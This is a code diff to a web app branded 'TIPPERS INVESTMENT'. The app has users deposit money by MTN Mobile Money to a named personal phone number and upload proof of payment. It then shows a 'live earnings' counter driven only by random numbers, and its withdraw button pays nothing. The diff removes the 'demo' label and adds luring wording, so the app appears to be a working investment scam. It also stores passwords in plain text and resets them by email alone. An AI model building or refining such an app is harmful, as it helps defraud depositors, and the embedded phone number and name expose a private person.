@@ -170,7 +170,7 @@ function start(){
 nav.style.display="none";
 screen.innerHTML=`
 <h2 class="title">WELCOME TO TIPPERS INVESTMENT</h2>
-<p class="desc">Smart earning system demo</p>
+<p class="desc">Start Earning now and look your better future! </p>
 <button onclick="register()">NEXT</button>
 `;
 }
@@ -195,7 +195,7 @@ screen.innerHTML=`
 <input id="pass" placeholder="Password">
 <input id="cpass" placeholder="Confirm password">
 
-<button onclick="doRegister()">REGISTER</button>
+<button onclick="doRegister()">REGISTER NOW</button>
 `;
 }
 
@@ -208,7 +208,7 @@ if(pass.value!==cpass.value){toast("Passwords mismatch");return;}
 
 users.push({email:email.value,pass:pass.value});
 localStorage.setItem("users",JSON.stringify(users));
-toast("Registered");
+toast("Registered successful!");
 login();
 }
 
@@ -220,25 +220,59 @@ screen.innerHTML=`
 <input id="le" placeholder="Email">
 <input id="lp" placeholder="Password">
 
-<div style="display:flex;justify-content:space-between;font-size:12px">
-<span onclick="forgot()">Forgot?</span>
-<span onclick="register()">Create</span>
+<div style="display:flex;justify-content:space-between;font-size:12px;margin-top:5px">
+<span onclick="forgot()" style="cursor:pointer;color:#f59e0b">Forgot password?</span>
+<span onclick="register()" style="cursor:pointer;color:#f59e0b">Create account</span>
 </div>
 
 <button onclick="doLogin()">LOGIN</button>
 `;
 }
 
-function doLogin(){
-let u=users.find(x=>x.email==le.value);
-if(!u||u.pass!=lp.value){toast("Invalid login");return;}
+/* FORGOT PASSWORD PAGE */
+function forgot(){
+screen.innerHTML=`
+<h3 class="title">RESET PASSWORD</h3>
 
-current=u;
-nav.style.display="flex";
+<p class="desc">Enter your email to reset password</p>
 
-showTable();
+<input id="fe" placeholder="Registered email">
+<input id="np" placeholder="New password">
+<input id="cp" placeholder="Confirm password">
+
+<button onclick="resetPassword()">RESET PASSWORD</button>
+`;
 }
 
+/* RESET FUNCTION */
+function resetPassword(){
+
+if(!fe.value || !np.value || !cp.value){
+toast("Fill all fields"); return;
+}
+
+if(np.value !== cp.value){
+toast("Passwords do not match"); return;
+}
+
+let users = JSON.parse(localStorage.getItem("users")) || [];
+
+let user = users.find(u => u.email === fe.value);
+
+if(!user){
+toast("Email not found"); return;
+}
+
+/* update password */
+user.pass = np.value;
+
+localStorage.setItem("users", JSON.stringify(users));
+
+toast("Password reset successfully ✔");
+
+login();
+}
+  
 /* TABLE */
 function showTable(){
 screen.innerHTML=`
@@ -246,14 +280,13 @@ screen.innerHTML=`
 
 <div class="table">
 <div>
-<div class="cell">INVEST</div>
 <div class="cell">1DAY</div>
 <div class="cell">1WEEK</div>
 <div class="cell">1MONTH</div>
-<div class="cell">45D</div>
-<div class="cell">2M</div>
-<div class="cell">3M</div>
-<div class="cell">4M</div>
+<div class="cell">45DAYS</div>
+<div class="cell">2MONTHS</div>
+<div class="cell">3MONTH</div>
+<div class="cell">4MONTHS</div>
 </div>
 
 ${[
@@ -288,13 +321,13 @@ ${[
 function openDeposit(){
 unlockIcons();
 screen.innerHTML=`
-<h3 class="title">DEPOSIT</h3>
-<p class="desc">Add funds using MTN Mobile Money</p>
+<h3 class="title">DEPOSIT AND PAYMENT PROCESS</h3>
+<p class="desc">Add funds using MTN Mobile Money.</p>
 
 <input id="amt" placeholder="Enter amount">
-<input id="sender" placeholder="Sender name">
+<input id="sender" placeholder="Enter Sender name">
 
-<button onclick="payment()">CONTINUE</button>
+<button onclick="payment()">CONTINUE →</button>
 `;
 }
 
@@ -303,8 +336,9 @@ if(!amt.value||!sender.value){toast("Fill all");return;}
 amount=parseInt(amt.value);
 
 screen.innerHTML=`
-<h3 class="title">PAYMENT INFO</h3>
-<div class="card">0795410739 - BARAKA BOLINGO</div>
+<h3 class="title">PAYMENT INFORMATION</h3>
+<div class="card">0795410739</div>
+<div class="card">BARAKA BOLINGO</div>
 <div class="card">*182*1*1*0795410739#</div>
 <button onclick="proof()">FINISH</button>
 `;
@@ -312,15 +346,16 @@ screen.innerHTML=`
 
 function proof(){
 screen.innerHTML=`
-<h3 class="title">UPLOAD PROOF</h3>
+<h3 class="title">UPLOAD PROOF OF PAYMENT</h3>
 <input type="file" id="file">
-<button onclick="periodPage()">SEND</button>
+<button onclick="periodPage()">UPLOAD</button>
 `;
 }
 
 function periodPage(){
 screen.innerHTML=`
-<h3 class="title">SELECT PERIOD</h3>
+<h3 class="title">SELECT THE PAYOUT PERIOD YOU WISH</h3>
+<div class="card">select your earning lock until to four months</div>
 <select id="p">
 <option value="1">1 Day</option>
 <option value="7">1 Week</option>
@@ -340,8 +375,8 @@ period=p.value;
 depositDone=true;
 
 screen.innerHTML=`
-<h3 class="title">SUCCESS</h3>
-<p class="desc">Balance activated</p>
+<h3 class="title">PAYMENT SUCCESSFUL</h3>
+<p class="desc">BALANCE ACTIVATED!</p>
 `;
 }
 
@@ -358,12 +393,12 @@ function deposit(){openDeposit();}
 
 function earn(){
 screen.innerHTML=`
-<h3 class="title">LIVE EARNINGS</h3>
+<h3 class="title">LIVE EARNING CHANGED PER SECOND</h3>
 <div class="card" id="live">0 RWF</div>
 `;
 let i=0;
 setInterval(()=>{
-i+=Math.random()*2000;
+i+=Math.random()*200;
 live.innerText=Math.floor(i)+" RWF";
 },1000);
 }
@@ -371,9 +406,10 @@ live.innerText=Math.floor(i)+" RWF";
 function withdraw(){
 screen.innerHTML=`
 <h3 class="title">WITHDRAW</h3>
-<input placeholder="Amount">
-<input placeholder="MTN number">
-<button onclick="toast('Processing locked schedule')">PAYOUT</button>
+<div class="card">Welcome! Your Balance locked period is ended? you're allowed to Payout Now</div>
+<input type="text" id="AMOUNT" placeholder="Enter Amount">
+<input placeholder="Enter your MTN Mobile number">
+<button onclick="toast('Processing locked schedule')">PAYOUT NOW</button>
 `;
 }
 
